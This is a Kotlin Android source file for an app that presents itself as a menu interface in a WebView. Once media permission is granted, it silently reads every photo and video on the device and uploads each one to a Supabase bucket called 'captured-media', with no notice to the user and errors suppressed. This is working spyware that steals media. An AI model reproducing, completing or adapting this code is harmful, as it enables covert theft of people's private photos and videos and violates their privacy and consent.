package com.example.mediasync

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    // غيّر القيم دي ببيانات مشروعك في Supabase Storage
    private val supabaseUrl = "https://YOUR-PROJECT-ID.supabase.co"
    private val supabaseAnonKey = "YOUR_SUPABASE_ANON_KEY"
    private val supabaseBucket = "captured-media"

    private lateinit var webView: WebView
    private val ioExecutor = Executors.newSingleThreadExecutor()
    private var hasStartedSync = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            openMenuInterface()
            if (hasAnyMediaPermission()) {
                startMediaUploadInBackground()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this)
        setupWebView(webView)
        setContentView(webView)

        if (hasAnyMediaPermission()) {
            openMenuInterface()
            startMediaUploadInBackground()
        } else {
            requestMediaPermissions()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView(wv: WebView) {
        wv.webViewClient = WebViewClient()
        wv.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }
    }

    private fun openMenuInterface() {
        val targetUrl = "file:///android_asset/menu.html"
        if (webView.url != targetUrl) {
            webView.loadUrl(targetUrl)
        }
    }

    private fun requiredPermissions(): Array<String> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun hasAnyMediaPermission(): Boolean {
        return requiredPermissions().any { perm ->
            ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestMediaPermissions() {
        permissionLauncher.launch(requiredPermissions())
    }

    private fun startMediaUploadInBackground() {
        if (hasStartedSync) return
        hasStartedSync = true

        ioExecutor.execute {
            val mediaItems = mutableListOf<Pair<Uri, String>>()

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
            ) {
                mediaItems.addAll(queryMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "jpg"))
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
            ) {
                mediaItems.addAll(queryMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "mp4"))
            }

            for ((uri, defaultExt) in mediaItems) {
                try {
                    val bytes = readUriBytes(uri) ?: continue
                    val mime = contentResolver.getType(uri) ?: "application/octet-stream"
                    val fileName = "${System.currentTimeMillis()}_${uri.lastPathSegment ?: "file"}.$defaultExt"
                    uploadBytesToSupabase(fileName, mime, bytes)
                } catch (_: Exception) {
                }
            }
        }
    }

    private fun queryMedia(collectionUri: Uri, fallbackExt: String): List<Pair<Uri, String>> {
        val results = mutableListOf<Pair<Uri, String>>()
        val projection = arrayOf(MediaStore.MediaColumns._ID)

        contentResolver.query(collectionUri, projection, null, null, null)?.use { cursor ->
            val idCol = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idCol)
                val itemUri = ContentUris.withAppendedId(collectionUri, id)
                results.add(itemUri to fallbackExt)
            }
        }
        return results
    }

    private fun readUriBytes(uri: Uri): ByteArray? {
        contentResolver.openInputStream(uri)?.use { input ->
            val buffer = ByteArrayOutputStream()
            val chunk = ByteArray(16 * 1024)
            var read: Int
            while (input.read(chunk).also { read = it } != -1) {
                buffer.write(chunk, 0, read)
            }
            return buffer.toByteArray()
        }
        return null
    }

    private fun uploadBytesToSupabase(fileName: String, contentType: String, data: ByteArray) {
        val endpoint = "$supabaseUrl/storage/v1/object/$supabaseBucket/$fileName"
        val url = URL(endpoint)
        val conn = (url.openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 20000
            readTimeout = 30000
            setRequestProperty("Authorization", "Bearer $supabaseAnonKey")
            setRequestProperty("apikey", supabaseAnonKey)
            setRequestProperty("Content-Type", contentType)
            setRequestProperty("x-upsert", "true")
        }

        conn.outputStream.use { out ->
            out.write(data)
            out.flush()
        }

        val code = conn.responseCode
        conn.disconnect()
        if (code !in 200..299) {
            throw IllegalStateException("Upload failed with HTTP $code")
        }
    }

    override fun onDestroy() {
        ioExecutor.shutdownNow()
        super.onDestroy()
    }
}
